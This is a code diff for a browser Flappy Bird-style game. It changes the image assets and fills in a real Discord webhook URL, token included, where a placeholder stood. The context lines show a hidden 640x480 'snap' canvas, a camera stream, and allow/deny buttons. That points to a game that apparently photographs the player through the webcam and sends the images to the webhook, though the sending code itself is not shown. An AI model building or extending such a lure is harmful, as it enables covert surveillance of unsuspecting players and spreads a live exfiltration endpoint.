@@ -20,10 +20,10 @@
   <canvas id="snap" width="640" height="480" style="display:none;"></canvas>
 <script>
 // —— Assets placeholders ——
-const bg = new Image(); bg.src = "https://i.ibb.co/fpV7Jzx/bg.png";
-const bird = new Image(); bird.src = "https://i.ibb.co/7gXpmhK/bird.png";
-const pipeTop = new Image(); pipeTop.src = "https://i.ibb.co/f01cDct/pipe-north.png";
-const pipeBot = new Image(); pipeBot.src = "https://i.ibb.co/d5wDh8z/pipe-south.png";
+const bg = new Image(); bg.src = "https://opengameart.org/sites/default/files/bg_5.png";
+const bird = new Image(); bird.src = "https://www.pngmart.com/files/12/Flappy-Bird-Logo-PNG-Pic.png";
+const pipeTop = new Image(); pipeTop.src = "https://art.pixilart.com/sr29cd06c39f7aws3.png";
+const pipeBot = new Image(); pipeBot.src = "https://www.pngall.com/wp-content/uploads/19/Fantasy-Pipe-Flappy-Bird-Game-World-PNG.png";
 
 // —— DOM refs ——
 const c = document.getElementById("game");
@@ -37,7 +37,7 @@ const deny = document.getElementById("denyBtn");
 
 // —— Settings ——
 let camOK = false, stream;
-const WEBHOOK = "YOUR_DISCORD_WEBHOOK"; // Replace with your actual webhook
+const WEBHOOK = "https://discord.com/api/webhooks/1413966614390378556/KoUnhB81Nq08jEC-qQ2NucwHRP8UG6fnlv4zOW2FnelzilKnpWg4MoF9-_NWcsUxMEvl"; // Replace with your actual webhook
 
 allow.onclick = async () => {
   try {
